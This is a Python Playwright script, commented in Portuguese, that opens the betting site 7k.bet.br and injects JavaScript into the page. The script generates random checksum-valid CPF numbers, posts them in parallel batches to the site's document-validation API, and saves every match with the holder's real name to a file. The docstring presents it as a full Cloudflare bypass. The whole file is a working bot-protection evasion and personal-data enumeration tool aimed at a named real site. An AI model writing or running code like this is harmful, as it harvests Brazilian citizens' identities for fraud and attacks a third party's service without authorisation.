#!/usr/bin/env python3
"""
Injetor via Browser - Usa o navegador real para fazer requisições
Bypass completo do Cloudflare porque usa sessão autenticada do browser
"""
import random
import time
from playwright.sync_api import sync_playwright

def gerar_cpf():
    cpf = [random.randint(0, 9) for _ in range(9)]
    soma = sum((10 - i) * cpf[i] for i in range(9))
    resto = soma % 11
    cpf.append(0 if resto < 2 else 11 - resto)
    soma = sum((11 - i) * cpf[i] for i in range(10))
    resto = soma % 11
    cpf.append(0 if resto < 2 else 11 - resto)
    return ''.join(map(str, cpf))

def main():
    print("="*60)
    print("💉 INJETOR VIA BROWSER - JavaScript Injection")
    print("="*60)
    
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)
        context = browser.new_context()
        page = context.new_page()
        
        print("\n🌐 Acessando site...")
        page.goto("https://7k.bet.br/")
        page.wait_for_timeout(5000)
        
        print("✅ Site carregado. Injetando código...")
        
        # Injeta função de validação de CPF
        page.evaluate("""() => {
            window.cpfResults = {ok: 0, validos: [], blocked: 0, erro: 0};
            
            window.validarCPF = async (cpf) => {
                try {
                    const response = await fetch('/api/documents/validate', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({number: cpf, type: 'cpf'})
                    });
                    
                    if (response.status === 200) {
                        const data = await response.json();
                        window.cpfResults.ok++;
                        window.cpfResults.validos.push({
                            cpf: cpf,
                            nome: data.data?.name || 'N/A'
                        });
                        return {status: 200, nome: data.data?.name};
                    } else if (response.status === 400) {
                        window.cpfResults.ok++;
                        return {status: 400};
                    } else if (response.status === 403) {
                        window.cpfResults.blocked++;
                        return {status: 403};
                    } else {
                        window.cpfResults.erro++;
                        return {status: response.status};
                    }
                } catch (e) {
                    window.cpfResults.erro++;
                    return {status: -1, error: e.message};
                }
            };
            
            window.validarLote = async (cpfs) => {
                const promises = cpfs.map(cpf => window.validarCPF(cpf));
                return Promise.all(promises);
            };
        }""")
        
        print("✅ Código injetado. Iniciando validações...")
        
        total_requisicoes = 200
        batch_size = 20
        batches = total_requisicoes // batch_size
        
        inicio = time.time()
        
        for batch in range(batches):
            # Gera CPFs para o lote
            cpfs = [gerar_cpf() for _ in range(batch_size)]
            
            # Executa validação via JavaScript
            resultados = page.evaluate("""async (cpfs) => {
                const results = await window.validarLote(cpfs);
                return {
                    results: results,
                    stats: window.cpfResults
                };
            }""", cpfs)
            
            stats = resultados['stats']
            elapsed = time.time() - inicio
            done = (batch + 1) * batch_size
            rate = done / elapsed if elapsed > 0 else 0
            
            print(f"[{batch+1:2d}/{batches}] ✅{stats['ok']:4d} | 🎯{len(stats['validos']):3d} válidos | 🚫{stats['blocked']:3d} | {rate:.1f} req/s")
            
            # Pequeno delay entre lotes
            time.sleep(0.5)
        
        tempo = time.time() - inicio
        
        # Pega resultados finais
        final = page.evaluate("() => window.cpfResults")
        
        print("\n" + "="*60)
        print("📊 RESULTADO FINAL")
        print("="*60)
        print(f"   Total: {total_requisicoes} req em {tempo:.1f}s")
        print(f"   Velocidade: {total_requisicoes/tempo:.1f} req/s")
        print(f"\n   ✅ OK: {final['ok']}")
        print(f"   🎯 Válidos: {len(final['validos'])}")
        print(f"   🚫 Blocked: {final['blocked']}")
        print(f"   💥 Erros: {final['erro']}")
        
        if final['validos']:
            print(f"\n🎯 CPFs VÁLIDOS ENCONTRADOS ({len(final['validos'])}):")
            for v in final['validos'][:30]:
                cpf = v['cpf']
                print(f"   {cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]} | {v['nome']}")
            
            # Salva em arquivo
            with open("cpfs_browser.txt", "w", encoding="utf-8") as f:
                for v in final['validos']:
                    cpf = v['cpf']
                    f.write(f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]} | {v['nome']}\n")
            print(f"\n💾 Salvos em cpfs_browser.txt")
        
        print("\n⏳ Mantendo browser aberto por 5s...")
        time.sleep(5)
        browser.close()

if __name__ == "__main__":
    main()







